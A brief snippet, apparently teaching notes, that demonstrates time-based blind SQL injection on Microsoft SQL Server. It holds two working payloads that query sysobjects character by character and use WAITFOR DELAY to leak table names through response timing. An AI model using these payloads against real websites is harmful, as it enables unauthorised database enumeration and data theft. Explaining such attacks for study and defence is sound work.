ProductProductPhoto is first table ordered by ID

Iterate character at a time to decipher table names (then columns, etc) simply timing website response

IF(EXISTS(
  select top 1 * from sysobjects where id=(
    select top 1 id from (
      select top 1 id from sysobjects where xtype='U' order by id
    ) sq order by id desc
  ) and ascii(lower(substring(name, 1, 1))) = 65 --anyone know what character this is?
))
WAITFOR DELAY '0:0:5'
.
.
.
IF(EXISTS(
  select top 1 * from sysobjects where id=(
    select top 1 id from (
      select top 1 id from sysobjects where xtype='U' order by id
    ) sq order by id desc
  ) and ascii(lower(substring(name, 1, 1))) = 112 --or this one?
))
WAITFOR DELAY '0:0:5'
